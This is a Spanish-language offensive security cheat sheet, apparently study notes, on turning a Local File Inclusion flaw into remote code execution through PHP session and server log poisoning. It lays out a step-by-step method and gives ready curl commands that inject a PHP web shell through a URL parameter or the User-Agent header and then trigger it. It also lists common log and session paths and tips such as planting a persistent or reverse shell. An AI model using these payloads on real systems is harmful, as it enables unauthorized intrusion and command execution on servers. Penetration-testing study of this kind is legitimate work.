---
tags:
  - logpoisoning
  - LFI
  - RCE
  - webapp
---
## Conceptos Clave (TL;DR)

* Esta técnica consiste en escribir código PHP en un campo controlable por el usuario que posteriormente se guarda en un archivo de registro (log) o de sesión.

* Depende de la existencia de una vulnerabilidad de Local File Inclusion (LFI) y de que la función de backend utilizada (como `include()`) tenga privilegios de ejecución.

* Es un requisito indispensable que la aplicación web tenga privilegios de lectura sobre los archivos de log o sesión objetivo.

* Aplica tanto a variables de sesión controlables como a campos de encabezados HTTP (ej. User-Agent) que quedan registrados en los logs del servidor.

  

## Herramientas Clave

* **Burp Suite**: Utilizado para interceptar peticiones LFI y manipular manualmente los encabezados HTTP, como el User-Agent, para inyectar cargas útiles.

* **cURL**: Herramienta de línea de comandos para enviar peticiones HTTP personalizadas y envenenar registros directamente desde la terminal.

* **Listas de palabras LFI (LFI Wordlists)**: Empleadas para realizar fuzzing y descubrir las ubicaciones absolutas de los archivos de registro si no se encuentran en las rutas por defecto.

  
## Metodología Paso a Paso

  
### Fase 1: PHP Session Poisoning

1. **Identificar la sesión y el parámetro controlable**: Inspeccionar la cookie `PHPSESSID` para determinar el nombre del archivo de sesión en el backend. Verificar mediante LFI si el archivo contiene valores que se pueden controlar desde la URL (ej. un parámetro de idioma).

2. **Inyectar la carga útil (Poisoning)**: Modificar el parámetro controlable en la URL asignándole una web shell en PHP codificada en formato URL. Al procesar la petición, el servidor guardará esta carga útil dentro del archivo de sesión.

3. **Ejecutar el código (RCE)**: Utilizar la vulnerabilidad LFI para incluir el archivo de sesión envenenado, pasando el comando deseado a través del parámetro definido en la web shell.

  
### Fase 2: Server Log Poisoning

1. **Validar lectura de logs**: Utilizar la vulnerabilidad LFI para intentar leer los archivos de registro de Apache o Nginx (ej. `access.log`).

2. **Envenenar el User-Agent**: Si se tiene acceso de lectura, interceptar una petición y modificar el encabezado `User-Agent` por una web shell en PHP.

3. **Ejecutar el código (RCE)**: Incluir la ruta del archivo de registro envenenado mediante el parámetro vulnerable de LFI y ejecutar comandos.

  
### Fase 3: Envenenamiento de otros servicios

1. **Identificar lectura de logs de servicios**: Comprobar mediante LFI si es posible leer registros de servicios expuestos como SSH, FTP o correo (SMTP).

2. **Inyectar a través de interacciones de red**: Intentar iniciar sesión en SSH/FTP utilizando código PHP como nombre de usuario, o enviar un correo electrónico que contenga código PHP. Esto hará que la carga útil se registre en sus respectivos logs.

3. **Ejecutar el código**: Incluir el registro del servicio envenenado a través de la vulnerabilidad LFI.

  
## Cheat Sheet de Comandos

### PHP Session Poisoning
```bash
# Inyectar una web shell basica en el archivo de sesion modificando un parametro vulnerable codificado en URL
curl -s "http://<TARGET_IP>:<TARGET_PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E" -H "Cookie: PHPSESSID=<COOKIE_VALUE>"
  

# Detonar la carga util incluyendo el archivo de sesion envenenado y ejecutando el comando 'id'
curl -s "http://<TARGET_IP>:<TARGET_PORT>/index.php?language=/var/lib/php/sessions/sess_<COOKIE_VALUE>&cmd=id" -H "Cookie: PHPSESSID=<COOKIE_VALUE>"
```
### Server Log Poisoning via cURL
```bash
# Crear un archivo de texto con el encabezado User-Agent modificado para contener una web shell en PHP
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
  

# Enviar la peticion al servidor inyectando el User-Agent desde el archivo creado para envenenar access.log
curl -s "http://<TARGET_IP>:<TARGET_PORT>/index.php" -H @Poison
 

# Detonar la ejecucion incluyendo el log de Apache envenenado
curl -s "http://<TARGET_IP>:<TARGET_PORT>/index.php?language=/var/log/apache2/access.log&cmd=id"
```

  

## "Gotchas" y Troubleshooting

* **Nombres de archivo de sesión**: El archivo en el backend coincide con el valor de la cookie de sesión pero precedido por el prefijo `sess_` (ej. `sess_<COOKIE_VALUE>`).

* **Rutas comunes de sesiones**: `/var/lib/php/sessions/` en Linux y `C:\Windows\Temp\` en Windows.

* **Rutas comunes de Logs de Servidor Web**:

  * Apache: `/var/log/apache2/` (Linux) y `C:\xampp\apache\logs\` (Windows).

  * Nginx: `/var/log/nginx/` (Linux) y `C:\nginx\log\` (Windows).

* **Rutas de logs de otros servicios**: `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log`.

* **Archivos alternativos**: Si no se tiene acceso a los logs estándar, intentar incluir `/proc/self/environ` o `/proc/self/fd/<PID>` (donde el PID suele estar entre 0 y 50), ya que estos también pueden registrar el User-Agent.

* **Permisos de Logs**: Por defecto, los logs de Nginx suelen ser legibles por usuarios de bajos privilegios como `www-data`, mientras que los de Apache suelen requerir privilegios altos (grupos root/adm) a menos que haya malas configuraciones.

* **Sobrescritura de sesión**: En el Session Poisoning, tras la inclusión y ejecución del comando, el archivo de sesión se sobrescribe. Para ejecutar otro comando se debe volver a inyectar la web shell. Lo ideal es aprovechar la primera ejecución para escribir una shell persistente o lanzar una reverse shell.

* **Precaución en producción**: Los archivos de registro del servidor pueden ser enormes. Cargarlos a través de LFI puede tardar demasiado o incluso colapsar el servidor. Se debe ser cuidadoso y no enviar peticiones innecesarias al intentar este vector de ataque.